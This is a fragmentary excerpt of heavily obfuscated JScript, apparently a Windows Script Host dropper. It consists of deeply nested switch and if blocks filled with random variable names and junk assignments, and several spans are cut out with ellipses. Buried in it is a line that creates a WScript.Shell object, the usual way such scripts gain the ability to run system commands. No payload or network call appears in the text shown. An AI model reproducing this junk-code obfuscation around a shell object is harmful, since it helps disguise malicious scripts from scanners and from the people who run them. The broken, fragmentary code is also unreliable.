...
case false:
	...
	if (adkufvor() === "zyru") {
		var giqvezcat = 6.3;
		var ockakcuwjomx = 'ycadt';
		var lnahufy = 41.0677;
		iviwdywru = lnahufy + ockakcuwjomx;
		iviwdywru = "ylwohy" + iviwdywru;
		var xovgacipqu = null;
		var apfurpekex = null;
	}
	if (opledg() === 940) {
...
case null:
	if (oddacgunrest() === 81) {
		...
		if (bjapneba == 'undefined') {
			var bwixrygmamde = 'ztemh';
			bwixrygmamde = "77563" + bwixrygmamde;
			var mxozixer = 0;
			var phuxbuknax = bsedme.CreateObject('WScript.Shell');
			var lyssugxidr = undefined;
			switch (lyssugxidr) {
			case 374:
				if (typeof eqapsig() == "boolean") {
					var kuvlybpevy = 832;
					if (kuvlybpevy === 610) {
						if (onzitynysl === '68932') {
							if (jdurirwet() === 615) {
				...
				if (yvgufopx == null) {
					var wwodibp = 'idtidbyxun';
					var ehyvfi = undefined;
					var ajugim = "93122";
					var qxuqom = true;
					var ekliztizma = 19.88;
					var akpunsy = "enazqiflir";
					var nanrewofhy = 211;
					omxuhegvov = akpunsy + nanrewofhy;
					omxuhegvov = '97041' + omxuhegvov;
				}
				break;
			case undefined:
				var iqawah = 1;
				...
				case null:
					if (smeqaro() == 14.88) {
						...
						var vkoqik = 1000;
						var okogafun = 10.209;
						var bfebracohr = '58051';
					}
					if (uphot() == 4.9) {
						var pudmoqyqpu = true;
						var uwregyw = 'wogyzmynqy';
						var bibyqimdo = 'ulyhcoxmu';
						bibyqimdo = 'ysvuqde' + bibyqimdo;
						var raglaludo = 22;
						raglaludo = "eha";
						var akwerkajjyx = null;
						var mecobnicsa = "occifrifo";
					}
					if (fgefixcaq === 847) {
					...
					if (womonycro < 25.2) {
						...
						case 'uro':
							if (ulumrodcu() == 1) {
								...
								var gumlothahqa = '77585';
								var pnehugfoc = 16.07;
								ejuxpip = pnehugfoc + gumlothahqa;
								ejuxpip = ejuxpip + '64262';
								var ihapwilhu = 0;
								var ndysdelezd = 'suzqy';
							...
							if (typeof ysefa() == "object") {
								...
								case undefined:
									...
									if (lihaqz() === 62) {
										...
										var mejsomo = null;
										var pakruc = 0;
										var ugebpupwes = "rbulwizy";
										var inhahbahafk = 3;
										owqihwoze = ugebpupwes + inhahbahafk;
										owqihwoze = owqihwoze + '72533';
									}
									break;
								case null:
